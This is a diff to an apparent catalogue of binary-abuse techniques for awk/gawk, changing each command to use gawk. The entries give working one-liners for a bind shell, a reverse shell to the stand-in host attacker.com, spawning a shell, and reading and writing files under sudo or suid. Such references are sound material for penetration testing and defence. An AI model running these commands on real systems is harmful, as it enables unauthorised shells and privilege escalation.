@@ -2,7 +2,7 @@
 functions:
   bind-shell:
   - code: |-
-      awk 'BEGIN {
+      gawk 'BEGIN {
           s = "/inet/tcp/12345/0/0";
           while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
           while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
@@ -10,21 +10,21 @@ functions:
     tty: false
   file-read:
   - code: |-
-      awk '//' /path/to/input-file
+      gawk '//' /path/to/input-file
     contexts:
       sudo:
       suid:
       unprivileged:
   file-write:
   - code: |-
-      awk 'BEGIN { print "DATA" > /path/to/output-file }'
+      gawk 'BEGIN { print "DATA" > /path/to/output-file }'
     contexts:
       sudo:
       suid:
       unprivileged:
   reverse-shell:
   - code: |-
-      awk 'BEGIN {
+      gawk 'BEGIN {
           s = "/inet/tcp/0/attacker.com/12345";
           while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
           while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
@@ -37,7 +37,7 @@ functions:
     tty: false
   shell:
   - code: |-
-      awk 'BEGIN {system("/bin/sh")}'
+      gawk 'BEGIN {system("/bin/sh")}'
     contexts:
       sudo:
       suid:
